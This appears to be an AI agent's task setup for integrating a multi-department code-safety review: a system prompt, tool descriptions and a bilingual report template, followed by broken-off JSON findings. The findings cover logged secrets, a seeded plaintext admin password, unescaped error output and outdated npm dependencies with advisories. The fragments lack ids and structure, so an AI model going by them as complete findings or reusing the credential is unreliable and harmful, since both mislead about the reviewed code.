header.system:
You are an AI agent powered by DeepSeek Harness.

You are the integrating analyst of a code-safety review. Six departments have each committed `findings/<department>.json` and `report/<department>.md` on their own branch, and this worktree is the merge of all of them. You write two files and nothing else: `findings.json` and `SAFETY-REPORT.md`.

Read `REPORTING.md` in this worktree first: it states the finding format, the exact sections of the report, the count lines both summaries carry, and the certificate's wording. Read `target.json` for the tree under review and the SHA-256 the certificate states. Read every `findings/*.json` and every `report/*.md` before writing anything. When a `report-template` skill is available, load it: it owns how the report reads, while `REPORTING.md` owns what the examiner mechanically decides and wins wherever the two differ in form.

Ask the examiner which findings do not hold before you write the union:

    for f in findings/*.json; do node verify-safety-report.mjs --findings "$f" --list-invalid; done

Every id it prints is dropped from `findings.json` and named under `## What was not covered`, with the reason. Dropping one silently fails the report.

`findings.json` is the union, deduplicated by `file` plus `line` plus `cwe`, keeping the entry whose `confidence` is higher. Copy each entry whole; do not rewrite a department's `snippet`, because the examiner compares it with the target's own text.

The report is a review by a language model, grounded by a static scanner and by the committed examiner, over the files the departments actually read. `## Scope and method` says that, names the departments that ran and the tools that ran, and states what was read rather than what exists. `## What was not covered` is not a formality: name the file kinds nobody opened, the classes of defect no department owns, the checks that did not run, and every dropped finding. Never write that the target is secure, safe or free of vulnerabilities — nothing this program did could support it, and the examiner refuses the claim.

Before you stop, run `node verify-safety-report.mjs --report`, fix every line it names, and commit everything. Work left uncommitted is not delivered and is not measured. Never write into the target tree, and never edit `verify-safety-report.mjs`, `target.json` or any department's committed files.


Use the read tool — not shell commands like cat — to inspect text files. Results include line numbers. Use offset and limit to continue reading large files.

Use the write tool to create files or completely replace file contents. Existing files are overwritten, so read an existing file first (the default fs-observation-policy requires it) and prefer edit for targeted changes.

Use the edit tool for targeted changes to existing UTF-8 text files. It replaces literal old_string with new_string; by default old_string must appear exactly once. If old_string appears multiple times, provide a more specific old_string or set replace_all to true. Read the file first (the default fs-observation-policy requires it), unless you just created or edited it in this session.

Use the glob tool — not shell find — to discover files by path pattern. A pattern with no "/" matches basenames at any depth, so "*" matches every file in the tree rather than its top level. Results are files only, never directories, and include hidden and ignored files: a result that fits comes back in modification-time order, while a larger one is sampled across top-level entries, so it spans the tree instead of one subtree.

Use the grep tool — not shell grep or rg — to search file contents. Use read on a matched file when you need surrounding context.

Check the [exit code: N] marker on every bash result; investigate failures before moving on.

Track every background job id you start. You are notified in-session when a job finishes — do not busy-poll or sleep on one; keep working on independent steps and do not duplicate a running job's work. Before giving a final answer, collect every still-relevant job with job_output (set wait: true only when you are genuinely blocked on it), and job_kill jobs that stopped mattering.

tools.name: bash
tools.description: Execute a bash command (`bash -c`) and return its stdout/stderr. Each call runs in a fresh shell: no state (cwd, variables, functions) persists between calls — pass `workdir` instead of using `cd`. Non-zero exits are reported as `[exit code: N]`. Current harness environment facts are exposed through managed `$DSH_*` variables; inspect them when needed. Commands may run under a file sandbox; a blocked file operation is reported as `[sandbox: file access denied under <mode> mode]` — a policy denial, not a bug in the command; do not retry another way. Long output is truncated to its tail; the full output is saved to a file whose path is reported when available. Set `run_in_background: true` for long-running commands: the call returns a job id immediately; read its output with `job_output` and stop it with `job_kill`.

description.description: Clear, concise description of what this command does in active voice, 5-10 words (shown in the UI). Examples: "ls" → "List files in current directory"; "git status" → "Show working tree status"; "npm install" → "Install package dependencies".

timeoutMs.description: Timeout in milliseconds. The executor applies its configured default and cap, and kills the command on expiry.

workdir.description: Working directory for this command. Defaults to the session workspace; a relative path is resolved against it.

run_in_background.description: Run in the background and return a job id immediately (collect with job_output, stop with job_kill). No timeout applies.

tools.name: edit
tools.description: Edit an existing UTF-8 text file by replacing literal text.

file_path.description: Path to edit, resolved by the filesystem backend.

old_string.description: Literal text to replace. Must match exactly.

new_string.description: Literal replacement text. Use an empty string to delete the match.

replace_all.description: Replace all matches. Defaults to false; when false, old_string must appear exactly once.

tools.name: glob
tools.description: Find files whose paths match a glob pattern. Returns matching file paths — never directories — including hidden and ignored files (VCS metadata directories are excluded). Up to 100 paths come back in modification-time order; a larger result instead returns 100 paths sampled across top-level entries, says so, and reports where the complete sorted list was saved. This tool does not enumerate directory entries.

pattern.description: Glob pattern to match file paths against (e.g. "**/*.ts", "src/**/*.test.js"). A pattern with no "/" matches the basename at any depth, so "*" and "*.ts" both search the whole tree; include a separator to anchor the depth.

path.description: Directory to search in. Defaults to the session workspace; a relative path resolves against it.

tools.name: grep
tools.description: Search file contents with a ripgrep regular expression. Returns matching lines with line numbers, grouped by file. Returns the first 250 matches inline; a capped result reports where the complete match list was saved. Use read on a matched file for surrounding context.

pattern.description: Regular expression to search for (ripgrep syntax).

path.description: File or directory to search. Defaults to the session workspace; a relative path resolves against it.

include.description: One glob filter for which files to search (e.g. "*.ts", "*.{js,jsx}"). Not a list; negation is not supported.

tools.name: job_kill
tools.description: Request cancellation of a running background job by job id. Returns immediately; the job settles as killed once its work actually stops.

job_id.description: Job id returned by the tool that started the background work.

reason.description: Optional short reason, recorded in the log and forwarded to the job.

tools.name: job_list
tools.description: List your background jobs (running and finished) with their ids, kinds, and statuses.

tools.name: job_output
tools.description: Read a background job. Stream jobs return only output since the previous read; final-output jobs return their result after settlement. Every response ends with `[status: ...]`. Reads are non-blocking unless `wait: true`, which waits up to the configured cap.

job_id.description: Job id returned by the tool that started the background work.

wait.description: Block until the job reaches a terminal status or the timeout expires. A timed-out wait returns [status: running] and leaves the job alive.

timeout_ms.description: Max wait in milliseconds (only meaningful with wait: true). Defaults to the configured wait timeout; capped by the configured maximum.

tools.name: read
tools.description: Read a UTF-8 text file and return line-numbered content.

file_path.description: Path to read, resolved by the filesystem backend.

offset.description: 1-based first line to return. Defaults to 1.

limit.description: Maximum number of lines to return. Defaults to 2000.

tools.name: skill
tools.description: Load the full instructions for an available skill. Call this with the exact skill name from the session skill catalog before acting on a task that names or clearly matches that skill.

name.description: The exact skill name from the available skills list.

tools.name: write
tools.description: Create or fully replace a UTF-8 text file.

file_path.description: Path to write, resolved by the filesystem backend.

content.description: Full UTF-8 text content to write.

<skill_instructions>
# The report layout

Every report has exactly these sections, in this order. Do not add marketing language, severity totals presented as a score out of ten, or a remediation timeline the review has no authority to commit the customer to.

- **`## Résumé exécutif`** — French. Counts per severity, the three most important findings by name and effect, what was and was not covered in one sentence each, and one paragraph on method.
- **`## Executive summary`** — the same content in English, for a mixed-language or non-French reader.
- **`## Scope and method`** — the repository, commit or tag reviewed, which directories or services were in scope, and a link to [review-method](../review-method/SKILL.md).
- **`## Findings`** — grouped by severity, critical first; one bullet per finding with its id, title, `file:line`, CWE, and confidence. Full detail (snippet, evidence, impact, fix) lives in the accompanying JSON per [severity-and-evidence](../severity-and-evidence/SKILL.md), not duplicated in prose here.
- **`## What was not covered`** — the [review-method](../review-method/SKILL.md) not-covered list, specific to this engagement.
- **`## Certificate`** — what a mechanical verifier checked after the fact: every finding resolves to a real file and line in the reviewed commit, every id is unique, every CWE/OWASP id is a known identifier, and no two findings share file, line, and CWE. This certifies the report's internal consistency, not the completeness or correctness of the review's judgment.

## Filled example: a small Express app

```markdown
## Résumé exécutif

Cette revue a porté sur le code source de commande-api, une application Express.js
de gestion de commandes, au commit a1b2c3d. Elle a permis d'identifier 3 constats :
1 critique, 1 moyen et 1 faible. Les plus importants : (1) une injection SQL
critique dans la recherche de commande par identifiant (src/routes/orders.js:42),
permettant de lire ou modifier toute donnée accessible par l'utilisateur de base de
données de l'application ; (2) une fixation de session lors de la connexion
(src/routes/auth.js:58) ; (3) l'absence de l'en-tête HSTS (src/app.js:12). La revue
a couvert les points d'entrée HTTP, l'authentification et la gestion des sessions ;
elle n'a pas couvert l'infrastructure de déploiement ni les dépendances tierces
(voir « Ce qui n'a pas été couvert »). Méthode : lecture des points d'entrée,
suivi des données de la source jusqu'au point d'exécution, un constat par point
d'exécution, ligne exactement citée et niveau de confiance déclaré pour chacun.

## Executive summary

This review covered commande-api, an Express.js order-management application, at
commit a1b2c3d, and found 3 issues: 1 critical, 1 medium, 1 low. The most
important: (1) a critical SQL injection in order lookup by id
(src/routes/orders.js:42); (2) session fixation on login
(src/routes/auth.js:58); (3) a missing HSTS header (src/app.js:12). HTTP entry
points, authentication, and session handling were covered; deployment
infrastructure and third-party dependencies were not (see "What was not covered").

## Scope and method

Repository commande-api, commit a1b2c3d, `src/` only. Method: [review-method](../review-method/SKILL.md).

## Findings

### Critical
- SEC-001 — SQL injection in order lookup — `src/routes/orders.js:42` — CWE-89 — confirmed

### Medium
- SEC-002 — Session id not rotated after login (session fixation) — `src/routes/auth.js:58` — CWE-384 — likely

### Low
- SEC-003 — Missing Strict-Transport-Security header — `src/app.js:12` — CWE-319 — confirmed

## What was not covered

- `infra/` (Terraform, Dockerfiles) and CI/CD configuration.
- Third-party dependency advisories (separate engagement).
- Runtime configuration: actual deployed environment variables, WAF rules, and network topology.
- Native mobile or memory-safety classes of bug: this codebase has no native module.

## Certificate

Mechanically verified: 3/3 findings resolve to an existing line at commit a1b2c3d;
3/3 ids unique; 3/3 CWE and OWASP ids recognized; 0 findings share file, line, and
CWE. This certifies internal consistency only, not completeness of coverage.
```
</skill_instructions>

"evidence": "config.js builds `config` by merging config/env/all.js (which defines `cookieSecret: \"session_cookie_secret_key_here\"` at all.js:8 and `cryptoKey: \"a_secure_key_for_crypto_here\"` at all.js:9) with the environment-specific file at line 10, then unconditionally dumps the whole merged object with `util.inspect(config, false, null)` at line 13 - `false` disables depth-limiting so every nested key, including the two secrets, is fully expanded in the printed string. "title": "The database seed script logs every seeded user record, including its plaintext password, to the console",

"impact": "Anyone with access to the container/build logs recovers valid plaintext credentials for the admin account (`admin` / `Admin_123`) and the two seeded user accounts, sufficient to log in directly.",

"title": "Unhandled exceptions render the raw error object to the client, unescaped",

"evidence": "app/routes/error.js is mounted as the last middleware (app/routes/index.js:82) and receives every `next(err)` call from the route handlers (e.g. session.js:100, profile.js:21/93, benefits.js:17/37, contributions and allocations handlers), most of which forward raw MongoDB driver errors unmodified. errorHandler passes the whole `err` object to the view at error.js:10-12 (`res.render(\"error-template\", { error: err })`) with no filtering of the message. error-template.html:11 interpolates it directly with `{{error}}`, and swig's global autoescape is turned off in server.js:137 (`autoescape: false`), so whatever `err.toString()`/`err.message` contains - including internal MongoDB error text - reaches the HTTP response body unescaped.",

"impact": "An attacker who triggers any unhandled error (a malformed request, a duplicate-key conflict, a downstream driver error) receives internal implementation detail in the response - and, because it is rendered unescaped, any error message built from attacker input becomes a reflected-XSS vector on top of the information disclosure.",

lines.text: "title": "bcrypt-nodejs (the password-hashing library) is deprecated and has never been updated beyond its first release",

"evidence": "package.json pins bcrypt-nodejs to the exact version 0.0.3; package-lock.json resolves node_modules/bcrypt-nodejs to that same 0.0.3 and itself carries the registry's own deprecated field: \"bcrypt-nodejs is no longer actively maintained. Please use bcrypt or bcryptjs.\" `npm view bcrypt-nodejs version` still returns 0.0.3 today -- no later release was ever published, so there is no newer version to move to within the package. app/data/user-dao.js line 1 does `require(\"bcrypt-nodejs\")` and uses it to hash every stored user password. npm audit reports no open CVE against it, so this is a maintenance finding, not an active-exploit finding.",

"impact": "The password-hashing library the whole authentication scheme depends on will receive no further fixes; it is a pure-JavaScript bcrypt reimplementation, not the audited native binding, and any weakness found in it in the future has no upstream to patch it.",
"fix": "Replace bcrypt-nodejs with the actively maintained `bcrypt` (native binding) or `bcryptjs` package and update the require in app/data/user-dao.js.",
"title": "body-parser 1.18.3 is vulnerable to two denial-of-service advisories and pulls a vulnerable qs",

"evidence": "package.json declares body-parser at ^1.15.1; package-lock.json resolves node_modules/body-parser to 1.18.3. `npm audit --json` run against this lockfile reports body-parser as vulnerable at range <=1.20.5 via two direct advisories: GHSA-qwcr-r2fm-qrc7 (\"denial of service when url encoding is enabled\", high, fixed in 1.20.3) and GHSA-v422-hmwv-36x6 (\"invalid limit value silently disables size enforcement\", low, fixed in 1.20.6). body-parser also depends on qs, itself flagged for 8 further advisories (prototype-pollution protection bypass GHSA-hrpp-h998-j3pp, event-loop DoS GHSA-f9cm-p3w6-xvr3, and others) at the resolved qs version. This package parses every incoming request body for the Express app in server.js, so the DoS is on the request path.",
"impact": "An attacker can send a crafted request body that exhausts server resources before any route handler validation runs, taking the application down for all users.",
"fix": "Upgrade body-parser to >=1.20.6 (npm audit reports a fix is available without a major bump); this also pulls a patched qs.",
"title": "csurf is deprecated/archived and depends on a cookie version with an input-validation advisory",

"evidence": "package.json declares csurf ^1.8.3; the lockfile resolves node_modules/csurf to 1.9.0. npm audit flags csurf (range >=1.3.0) via its transitive cookie dependency, GHSA-pxg6-pf52-xh8x (\"cookie accepts cookie name, path, and domain with out of bounds characters\", low, fixed in cookie 0.7.0). Separately, `npm view csurf deprecated` returns the maintainers' own notice: \"This package is archived and no longer maintained.\" There is no newer csurf release (latest on the registry is 1.11.0, still tracking the old cookie range) that resolves this cleanly.",

"impact": "The CSRF-token middleware used across the app's forms depends on a cookie parser that can accept out-of-spec characters in cookie attributes; combined with the package itself being unmaintained, no future cookie-parsing issue in this dependency chain will be fixed by upstream.",

"fix": "Pin an `overrides`/`resolutions` entry to force cookie >=0.7.0, and plan a migration off csurf (archived) to a maintained CSRF middleware such as `csrf-csrf` or Express's own double-submit-cookie pattern.",
"title": "Express 4.16.4 carries an open-redirect advisory, a reflected-XSS advisory, and 6 further transitive advisories",

"evidence": "package.json declares express ^4.13.4; the lockfile resolves node_modules/express to 4.16.4. npm audit reports express (range <=4.21.2) with two advisories on express itself: GHSA-rv95-896h-c2vc (\"Express.js Open Redirect in malformed URLs\", moderate, fixed <4.19.2) and GHSA-qw6h-vgh9-j6wx (\"express vulnerable to XSS via response.redirect()\", low, fixed <4.20.0). The same audit run lists express as the direct dependency pulling in 6 further vulnerable transitive packages -- body-parser, cookie, path-to-regexp, qs, send, serve-static -- each with its own advisories (path-to-regexp ReDoS GHSA-rhx6-c78j-4q9w, serve-static/send XSS via template injection GHSA-cm22-4g7w-348p and GHSA-m6fv-jmcg-4jfg among them). body-parser's own advisories are reported as a separate finding.",

"impact": "A malformed URL reaching res.redirect() (or a raw path-to-regexp route) can send a victim to an attacker-controlled destination or reflect script back into the response; the transitive chain adds a further set of DoS and template-injection vectors on the same request path.",
"fix": "Upgrade express past 4.21.2 (or to the current 5.x line); npm audit reports a fix is available in this repository's lockfile constraints.",
"title": "express-session 1.15.6 depends on vulnerable cookie and on-headers packages",

"evidence": "package.json declares express-session ^1.13.0; the lockfile resolves node_modules/express-session to 1.15.6. npm audit reports express-session (range 1.0.1-1.18.1) as vulnerable through two transitive packages: cookie, GHSA-pxg6-pf52-xh8x (out-of-bounds cookie attribute characters, low) and on-headers, GHSA-76c9-3jph-rj3q (\"on-headers is vulnerable to http response header manipulation\", low, fixed <1.1.0). express-session is the package that issues and reads the application's authenticated session cookie (configured in server.js).",

"impact": "A crafted cookie attribute or a response passing through on-headers could let an attacker inject or manipulate response headers on the session-cookie path, a low-severity but directly session-adjacent issue.",
"fix": "Upgrade express-session; npm audit reports a non-major fix is available that resolves the cookie and on-headers ranges.",
"title": "forever 2.0.0 pulls a chain (flatiron -> nconf -> optimist -> minimist) with critical prototype-pollution advisories",

"evidence": "package.json declares forever ^2.0.0 as a production dependency (not a devDependency); the lockfile resolves node_modules/forever to 2.0.0. npm audit's aggregate severity for forever is \"critical\", driven by a chain it depends on: flatiron -> broadway -> nconf (GHSA-6xwr-q98w-rvg7, prototype pollution, high) -> optimist -> minimist (GHSA-xvch-5gv4-984h, prototype pollution, critical). A second branch, forever-monitor -> chokidar -> anymatch -> micromatch -> braces, adds a ReDoS advisory (GHSA-grv7-fg5c-xmjg). I read the audit chain but did not trace forever's own code to confirm which of these libraries parses attacker-reachable input versus only local CLI/config arguments at process-start time, which is why this is `likely` rather than `confirmed`.",

"impact": "If any of the vulnerable parsers in this chain (nconf/optimist/minimist) is reachable from data forever handles at runtime rather than only from local startup configuration, an attacker could pollute Object.prototype and change application behavior; forever is used here to run/restart the server process rather than to handle web requests directly, which likely limits, but does not eliminate, remote reachability.",
"fix": "Upgrade forever to 4.0.3 (a major-version fix per npm audit) or replace it with a maintained process manager (pm2, systemd) since forever's own upstream has been mostly dormant.",
"title": "helmet 2.3.0 is three major versions behind and pulls a ReDoS-flagged debug and a CSP config-override bug",

"evidence": "package.json declares helmet ^2.0.0; the lockfile resolves node_modules/helmet to 2.3.0 (current helmet major is 8.x). npm audit reports helmet (range 0.3.0-3.20.1) via two transitive packages: connect -> debug, GHSA-9vvw-cc9w-f27h (\"debug Inefficient Regular Expression Complexity\", high, fixed <2.6.9), and helmet-csp, GHSA-c3m8-x3cg-qm2c (\"Configuration Override in helmet-csp\", moderate, fixed <2.9.1). This is the middleware that sets the app's security headers in server.js.",

"impact": "A crafted debug-log input could trigger catastrophic backtracking (DoS) in this dependency of the security-header middleware, and the CSP configuration-override bug could let an attacker weaken the Content-Security-Policy the app believes it is sending.",
"fix": "Upgrade helmet to a current major version (helmet no longer bundles helmet-csp or the vulnerable debug/connect chain in its modern releases); npm audit reports a fix is available.",
"title": "marked 0.3.5 has six known advisories including two sanitization-bypass/XSS issues and two ReDoS issues",

"evidence": "package.json pins marked to the exact version 0.3.5, and the lockfile confirms node_modules/marked resolves to 0.3.5. npm audit (range <=4.0.9) lists six direct advisories against marked at or below this version: GHSA-7px7-7xjx-hxm8 (XSS from data URIs, moderate, fixed <0.3.7), GHSA-vfvf-mqq8-rwqc (sanitization bypass via HTML entities, moderate, fixed <0.3.6), GHSA-p9wx-2529-fp83 (ReDoS, moderate, fixed <0.3.17), GHSA-x5pg-88wf-qq4p (ReDoS, high, fixed <0.3.9), and two further inefficient-regex advisories fixed only at 4.0.10 (GHSA-rrrm-qjm4-v8hf, GHSA-5v2h-r2cx-5xgj). marked converts markdown to HTML for this app's memo/research pages.",

"impact": "Markdown containing a crafted data URI or entity sequence can bypass marked's own sanitization and render as executable script in a victim's browser, and several of the same inputs can hang the renderer via catastrophic backtracking.",

"fix": "Upgrade marked to at least 0.3.19 for the pre-4.x advisories, or to the current major, and re-verify any output is still passed through the app's own HTML sanitization before being written to the page.",
"title": "mongodb driver 2.2.36 has a direct DoS advisory and a critical deserialization advisory in its bundled bson",

"evidence": "package.json declares mongodb ^2.1.18; the lockfile resolves node_modules/mongodb to 2.2.36. npm audit (range <=3.1.12) reports GHSA-mh5c-679w-hh4r (\"Denial of Service in mongodb\", high, fixed <3.1.13) directly on the driver, and a further critical advisory on its bundled mongodb-core -> bson dependency: GHSA-v8w9-2789-6hhr (\"Deserialization of Untrusted Data in bson\", critical, fixed <1.1.4). This driver is required by every *-dao.js file in app/data/ and is the layer through which all application data flows to MongoDB.",

"impact": "A crafted document or query response reaching the vulnerable bson deserializer can crash the process or, per the advisory's classification, lead to unsafe deserialization; the current driver is over 40 minor releases and two major versions behind the maintained 7.x line, which has dropped this bson path entirely.",

"fix": "Upgrade the mongodb driver (npm audit's suggested fix is the current major, 7.6.0); this is a breaking change to the driver API and will require touching every DAO file, so plan it as a scoped migration rather than a patch bump.",
"title": "needle is pinned to an exact 2018 release, four major versions behind current",

"evidence": "package.json pins needle to the exact version 2.2.4, published 2018-09-22 per the registry's own `time` metadata; the lockfile confirms node_modules/needle resolves to 2.2.4. The current needle release is 3.5.0 (published 2026-03-12). `npm audit --json` against this lockfile reports no open advisory for needle at this version, so this is not a vulnerability finding, only an outdated-and-pinned-exact finding: the caret is absent, so `npm install` will never move this forward even for patch releases.",

"impact": "needle makes outbound HTTP requests on the app's behalf; being four majors behind means any security fix needle has shipped since 2018 (TLS defaults, redirect handling, header injection hardening) is not present, and the exact pin means nobody will notice a fix is available without deliberately checking.",
"fix": "Remove the exact pin in favor of a caret range and upgrade to the current needle major, re-testing any code that depends on its specific response-handling behavior.",
"title": "node-esapi, the security-encoding library, has had exactly one release and it is 11+ years old",

"evidence": "package.json pins node-esapi to 0.0.1; the lockfile confirms node_modules/node-esapi resolves to 0.0.1. The registry's own version-time metadata for node-esapi shows a single published version, 0.0.1, created 2014-01-31, with no release since. npm audit reports no open advisory, because this package has effectively no maintainer activity for a vulnerability database to track against. node-esapi is a port of OWASP's ESAPI encoder, i.e. it is specifically depended on here for output-encoding/XSS-prevention helpers.",

"impact": "The library this app may lean on for encoding untrusted output has not been touched since 2014 and tracks no upstream OWASP ESAPI changes since; any gap in its encoding coverage found today has no path to a fix.",

"fix": "Replace node-esapi with a maintained output-encoding library appropriate to the templating engine in use (e.g. the `he` or `lodash.escape` packages for HTML-entity encoding, or the templating engine's own auto-escaping).",
"title": "swig 1.4.2 has an unpatched arbitrary local file read advisory and is marked no-longer-maintained",

"evidence": "package.json declares swig ^1.4.2; the lockfile resolves node_modules/swig to 1.4.2, the last version ever published. npm audit reports GHSA-2rq5-699j-x7p6 (\"Arbitrary local file read vulnerability during template rendering\", high, range <=1.4.2) directly against swig, with `fixAvailable: false` -- npm audit itself confirms there is no patched release to move to. `npm view swig deprecated` returns \"This package is no longer maintained.\" swig also pulls optimist -> minimist (GHSA-xvch-5gv4-984h, critical prototype pollution) and uglify-js (GHSA-c9f4-xj24-8jqx, ReDoS, high). swig is the templating engine wired up via consolidate for this app's views.",

"impact": "The unpatched file-read advisory means a template-rendering path that includes attacker-influenced input could be used to read arbitrary files on the server, and there is no version of swig this app could upgrade to that fixes it.",
"fix": "Migrate off swig entirely (it is archived); consolidate, which this app also depends on, supports several actively maintained template engines (e.g. EJS, Nunjucks) as drop-in replacements.",
"title": "underscore 1.9.1 is within the range vulnerable to CVE-2021-23358 (arbitrary code execution via template())",

"evidence": "package.json declares underscore ^1.8.3; the lockfile resolves node_modules/underscore to 1.9.1. npm audit reports GHSA-cf4h-3jhx-xvhq (\"Arbitrary Code Execution in underscore\", critical, range >=1.3.2 <1.12.1) -- 1.9.1 falls inside this range -- and a second advisory, GHSA-qpx9-hpmf-5gmw (\"unlimited recursion in _.flatten and _.isEqual\", high, range <=1.13.7, still open in the latest 1.13.8 per the advisory's own range). The current published underscore is 1.13.8, one patch above the declared floor of this app's caret range.",

"impact": "GHSA-cf4h-3jhx-xvhq lets an attacker who controls a value passed into underscore's `template()` function execute arbitrary JavaScript on the server; whether this app reaches that function with attacker-controlled input was not traced as part of this dependency-only review, so treat this as a confirmed vulnerable dependency with impact conditional on a call-site the code-review departments should check.",
"fix": "Upgrade underscore to >=1.12.1 at minimum (fixes the code-execution advisory) and ideally to the current 1.13.8.",

"evidence": "package.json declares async ^2.0.0-rc.4 as a devDependency; the lockfile resolves node_modules/async to 2.6.1. npm audit reports GHSA-fwr7-v2mv-hh25 (\"Prototype Pollution in async\", high, range >=2.0.0 <2.6.4) directly against this exact resolved version. async is a build/test-time dependency only (not in the `dependencies` block), so this does not ship in the running application; the risk is to whatever consumes untrusted data during development, testing or CI runs of this repository.",

"impact": "If a build or test script feeds external/untrusted JSON through this async version's affected functions, an attacker who controls that input could pollute Object.prototype for the duration of the dev/CI process.",
"fix": "Upgrade async to >=2.6.4 (a non-major bump per npm audit / the advisory's fixed range).",
"title": "cypress 3.3.1 (devDependency) is 13+ major versions behind and carries a very large transitive advisory chain",

"evidence": "package.json declares cypress ^3.3.1; the lockfile resolves node_modules/cypress to 3.3.1 (current cypress major is 16.x). npm audit's aggregate entry for cypress carries no direct advisory on cypress itself but reaches, through its dependency tree, at least 8 further vulnerable packages with their own advisories: debug (ReDoS, GHSA-9vvw-cc9w-f27h), extract-zip (symlink path traversal, GHSA-jmr9-qjv8-65gv / GHSA-7pqw-9j4j-h8q3), lodash (multiple, incl. critical prototype pollution GHSA-jf85-cpcp-j695 and code injection via `_.template`, GHSA-r5fr-rjxr-66jc), moment (path traversal, GHSA-8hfj-j24r-96c4), and the fully-deprecated `request` package's own chain (critical form-data unsafe-random advisory GHSA-fjxv-7rqg-78g4, SSRF GHSA-p8p7-x288-28g6). I counted these from the audit output but did not trace which of cypress's own code paths actually invoke the vulnerable functions, hence `likely`.",

"impact": "cypress is a devDependency (test runner), so this is a supply-chain/CI risk rather than a production-request risk: a compromised transitive package here would run with the privileges of whoever runs `npm test`/CI, not with the privileges of the deployed app.",
"fix": "Upgrade cypress to a current major version; this is a large breaking change (test syntax has changed significantly since 3.x) and should be scoped as its own migration.",
"title": "grunt 1.0.3 (devDependency, and the project's own `npm test`/precommit runner) has three direct advisories",

"evidence": "package.json declares grunt ^1.0.3; the lockfile resolves node_modules/grunt to 1.0.3. npm audit reports three direct advisories against grunt at this version: GHSA-m5pj-vjjf-4m3h (\"Arbitrary Code Execution in grunt\", high, fixed <1.3.0), GHSA-rm36-94g8-835r (\"Race Condition in Grunt\", high, fixed <1.5.3), and GHSA-j383-35pm-c5h4 (\"Path Traversal in Grunt\", moderate, fixed <1.5.2). It also pulls grunt-legacy-util -> getobject with a critical prototype-pollution advisory (GHSA-957j-59c2-j692) and a js-yaml chain with 6 further advisories including code injection (GHSA-8j8c-7jfh-h6hx). This is the same `grunt` invoked by this repo's own `npm test`, `precommit`, and `db:seed` scripts (package.json scripts block), so it runs routinely, including in CI (.travis.yml, .github/workflows).",

"impact": "A malicious Gruntfile task, plugin, or crafted YAML config processed by this exact grunt/js-yaml combination could achieve code execution in whatever environment runs `npm test` or the precommit hook, including CI runners.",

"fix": "Upgrade grunt to >=1.6.1 or later (npm audit reports a fix is available) to close the three direct advisories; the getobject and js-yaml transitive fixes generally come along with a current grunt-cli/grunt-legacy-util pairing.",
"title": "jshint 2.12.0 (devDependency) pulls a ReDoS-flagged minimatch and shelljs; the same chain is duplicated via grunt-contrib-jshint and grunt-if",

"evidence": "package.json pins jshint to the exact version 2.12.0; the lockfile confirms node_modules/jshint resolves to 2.12.0. npm audit reports jshint as vulnerable through minimatch (5 ReDoS advisories, e.g. GHSA-hxm2-r34f-qmc5, high, fixed <3.0.2) and shelljs (GHSA-4rq4-32rv-6wp6, \"Improper Privilege Management\", high, fixed <0.8.5). package.json separately declares grunt-contrib-jshint (^3.0.0, line 48) and grunt-if (a GitHub-tarball dependency, line 51), both of which npm audit flags for the identical jshint->minimatch/shelljs chain rather than a distinct advisory, so they are noted here rather than filed as separate findings.",

"impact": "jshint (and the grunt tasks that wrap it) run as part of this repo's own linting/precommit workflow; a crafted filename or lint-config string reaching the vulnerable minimatch pattern-matcher could hang the lint process (DoS to the dev/CI workflow), not the deployed application.",

"fix": "Upgrade jshint's minimatch and shelljs (npm audit reports fixAvailable: false for the jshint entry itself, meaning a manual override/resolutions entry, or a move to a maintained linter such as ESLint, is needed).",
"title": "mocha 2.5.3 (devDependency) pulls growl, which has a critical command-injection advisory",

"evidence": "package.json declares mocha ^2.4.5; the lockfile resolves node_modules/mocha to 2.5.3 (current mocha major is 12.x). npm audit reports mocha's growl dependency with GHSA-qh2h-chj9-jffq (\"Growl before 1.10.0 vulnerable to Command Injection\", critical, fixed <1.10.0), plus further advisories via debug (ReDoS), diff, glob->minimatch (ReDoS), and mkdirp->minimist (critical prototype pollution). I did not verify whether this app's own test suite invokes mocha's growl desktop-notification path (it typically triggers only when a local `--growl` flag is used interactively), which is why this is `likely` rather than `confirmed`.",

"impact": "If growl's notification path is reached with a value an attacker influences (e.g. a test/spec name pulled from untrusted input), it could result in command execution on whatever machine runs the test suite; absent that flag, the exposure is limited to the other, lower-severity advisories in this chain.",
"fix": "Upgrade mocha to a current major version; growl is optional and, if it is not needed, can also be excluded/overridden directly.",
"title": "nodemon 1.19.1 (devDependency) pulls a ReDoS-flagged chokidar/braces chain and an outdated update-notifier",

"evidence": "package.json declares nodemon ^1.19.1; the lockfile resolves node_modules/nodemon to 1.19.1 (current nodemon major is 3.x). npm audit reports the file-watcher chain chokidar -> anymatch -> micromatch -> braces with GHSA-grv7-fg5c-xmjg (\"Uncontrolled resource consumption in braces\", high, fixed <3.0.3), and separately update-notifier -> boxen -> ... -> cross-spawn with GHSA-3xgq-45jj-v275 (ReDoS, high). nodemon is invoked by this repo's `npm run dev` script (package.json scripts block) to watch and restart the server during development.",

"impact": "A crafted filename or glob pattern in the watched directory tree could trigger catastrophic backtracking in nodemon's file-matcher during local development; this does not affect the deployed application, which does not run nodemon.",
"fix": "Upgrade nodemon to a current major version (npm audit reports a fix is available, though it is a semver-major bump).",
"title": "selenium-webdriver 2.53.3 (devDependency) pulls adm-zip and tmp packages with DoS and path-traversal advisories",

"evidence": "package.json declares selenium-webdriver ^2.53.2; the lockfile resolves node_modules/selenium-webdriver to 2.53.3 (current major is 4.x). npm audit reports this pulls adm-zip with GHSA-xcpc-8h2w-3j85 (\"crafted ZIP file triggers 4GB memory allocation\", high, fixed <0.6.0) and GHSA-7q85-xj36-vmfc (uncontrolled memory allocation, high, fixed <0.6.1), and tmp with GHSA-ph9p-34f9-6g65 (path traversal via unsanitized prefix/postfix, high, fixed <0.2.6). This is a devDependency used for browser-automation tests, not part of the running application.",
"impact": "A crafted ZIP artifact processed by this old adm-zip during a test run could exhaust memory on the test runner (CI); this does not reach production traffic.",
"fix": "Upgrade selenium-webdriver to a current major version (npm audit reports a semver-major fix is available).",
"title": "zaproxy 0.2.0 (devDependency) pulls a lodash and a fully-deprecated request package, each with critical advisories",

"evidence": "package.json declares zaproxy ^0.2.0; the lockfile resolves node_modules/zaproxy to 0.2.0. npm audit reports this pulls lodash (10 advisories including critical prototype pollution GHSA-jf85-cpcp-j695) and request (itself deprecated, pulling form-data's critical unsafe-boundary advisory GHSA-fjxv-7rqg-78g4 and an SSRF advisory GHSA-p8p7-x288-28g6). zaproxy is a devDependency wrapping the OWASP ZAP security-scanning API; I read the audit chain but did not trace whether this project's own scripts call the specific vulnerable lodash/request functions, hence `likely`.",

"impact": "This is a dev/CI-only exposure: a compromised or malicious ZAP scan response processed by this vulnerable request/lodash chain could affect whatever machine runs the security scan, not the deployed application.",
